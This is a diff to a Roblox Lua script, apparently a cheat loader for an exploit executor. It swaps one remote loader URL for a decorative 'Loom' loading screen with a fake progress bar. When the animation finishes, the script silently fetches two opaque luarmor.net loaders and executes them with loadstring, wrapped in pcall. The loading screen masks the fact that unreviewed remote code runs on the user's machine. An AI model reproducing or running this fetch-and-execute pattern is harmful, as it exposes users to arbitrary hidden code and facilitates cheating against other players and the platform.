@@ -1,2 +1,167 @@
-loadstring(game:HttpGet("https://other.4x4z.lol/raw/loader.lua"))()
+--// i just found this gui from random gc boi ✌️😂😂
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
 
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LoaderGui"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = Player:WaitForChild("PlayerGui")
+
+local Loader = Instance.new("Frame")
+Loader.Name = "Loader"
+Loader.Size = UDim2.fromOffset(320, 150)
+Loader.Position = UDim2.fromScale(0.5, 0.5)
+Loader.AnchorPoint = Vector2.new(0.5, 0.5)
+Loader.BackgroundColor3 = Color3.fromRGB(0, 0, 50)
+Loader.BorderSizePixel = 0
+Loader.Parent = ScreenGui
+
+local LoaderCorner = Instance.new("UICorner")
+LoaderCorner.CornerRadius = UDim.new(0, 12)
+LoaderCorner.Parent = Loader
+
+local Stroke = Instance.new("UIStroke")
+Stroke.Color = Color3.fromRGB(30, 144, 255) 
+Stroke.Thickness = 2
+Stroke.Transparency = 0.3
+Stroke.Parent = Loader
+
+local Background = Instance.new("Frame")
+Background.Size = UDim2.fromScale(1, 1)
+Background.BackgroundColor3 = Color3.fromRGB(0, 0, 50)
+Background.BackgroundTransparency = 0.1
+Background.BorderSizePixel = 0
+Background.Parent = Loader
+
+local BgCorner = Instance.new("UICorner")
+BgCorner.CornerRadius = UDim.new(0, 12)
+BgCorner.Parent = Background
+
+local Icon = Instance.new("ImageLabel")
+Icon.Size = UDim2.fromOffset(20, 20)
+Icon.Position = UDim2.fromOffset(15, 12)
+Icon.BackgroundTransparency = 1
+Icon.Image = "rbxassetid://10709818626"
+Icon.Parent = Loader
+
+local Text = Instance.new("TextLabel")
+Text.Size = UDim2.fromOffset(260, 20)
+Text.Position = UDim2.fromOffset(42, 12)
+Text.BackgroundTransparency = 1
+Text.Text = 'Please wait while <font color="#1E90FF">Loom</font> loads, ObscuredCorporeality!'
+Text.RichText = true
+Text.TextColor3 = Color3.fromRGB(200, 200, 200)
+Text.Font = Enum.Font.GothamMedium
+Text.TextSize = 12
+Text.TextXAlignment = Enum.TextXAlignment.Left
+Text.Parent = Loader
+
+local CenterImage = Instance.new("ImageLabel")
+CenterImage.Size = UDim2.fromOffset(45, 45)
+CenterImage.Position = UDim2.fromScale(0.5, 0.45)
+CenterImage.AnchorPoint = Vector2.new(0.5, 0.5)
+CenterImage.BackgroundTransparency = 1
+CenterImage.Image = "rbxassetid://10709818626"
+CenterImage.ImageColor3 = Color3.fromRGB(200, 200, 200)
+CenterImage.Parent = Loader
+
+local BarBg = Instance.new("Frame")
+BarBg.Size = UDim2.new(0.8, 0, 0, 4)
+BarBg.Position = UDim2.fromScale(0.5, 0.85)
+BarBg.AnchorPoint = Vector2.new(0.5, 1)
+BarBg.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
+BarBg.BorderSizePixel = 0
+BarBg.Parent = Loader
+
+local BarBgCorner = Instance.new("UICorner")
+BarBgCorner.CornerRadius = UDim.new(1, 0)
+BarBgCorner.Parent = BarBg
+
+local BarFill = Instance.new("Frame")
+BarFill.Size = UDim2.fromScale(0, 1)
+BarFill.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
+BarFill.BorderSizePixel = 0
+BarFill.Parent = BarBg
+
+local BarFillCorner = Instance.new("UICorner")
+BarFillCorner.CornerRadius = UDim.new(1, 0)
+BarFillCorner.Parent = BarFill
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.fromOffset(200, 15)
+Status.Position = UDim2.fromScale(0.5, 0.86)
+Status.AnchorPoint = Vector2.new(0.5, 0)
+Status.BackgroundTransparency = 1
+Status.Text = "Starting..."
+Status.TextColor3 = Color3.fromRGB(150, 150, 200)
+Status.Font = Enum.Font.GothamBold
+Status.TextSize = 11
+Status.TextXAlignment = Enum.TextXAlignment.Right
+Status.Parent = Loader
+
+local function AnimateProgressBar(Duration, Steps)
+    local StepDuration = Duration / Steps
+
+    for I = 1, Steps do
+        local Progress = I / Steps
+
+        local Tween = TweenService:Create(
+            BarFill,
+            TweenInfo.new(StepDuration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Size = UDim2.fromScale(Progress, 1)}
+        )
+
+        Tween:Play()
+        Tween.Completed:Wait()
+        -- what a skid text shit
+        if Progress < 0.3 then
+            Status.Text = "Loading core modules..."
+        elseif Progress < 0.6 then
+            Status.Text = "Initializing components..."
+        elseif Progress < 0.9 then
+            Status.Text = "Finalizing setup..."
+        end
+    end
+
+    local FinalTween = TweenService:Create(
+        BarFill,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {Size = UDim2.fromScale(1, 1)}
+    )
+    FinalTween:Play()
+    FinalTween.Completed:Wait()
+
+    Status.Text = "Done!"
+    task.wait(0.25)
+
+    local elementsToFade = {Icon, Text, CenterImage, BarBg, Status, Stroke, Background}
+    for _, element in ipairs(elementsToFade) do
+        local props = {}
+        if element:IsA("TextLabel") then props.TextTransparency = 1
+        elseif element:IsA("ImageLabel") then props.ImageTransparency = 1
+        elseif element:IsA("Frame") or element:IsA("UIStroke") then
+            if element:IsA("UIStroke") then props.Transparency = 1 else props.BackgroundTransparency = 1 end
+        end
+        TweenService:Create(element, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
+    end
+    task.wait(0.4)
+
+    TweenService:Create(
+        Loader,
+        TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In),
+        {Size = UDim2.fromOffset(0, 0), BackgroundTransparency = 1}
+    ):Play()
+    task.wait(0.45)
+
+    ScreenGui:Destroy()
+
+    pcall(function()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2cec2149b6d276d879767b440999c56a.lua"))()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/7f6c7bc8c68809f983a33161d1186396.lua"))()
+    end)
+end
+
+task.spawn(function()
+    AnimateProgressBar(2.5, 12) 
+end)
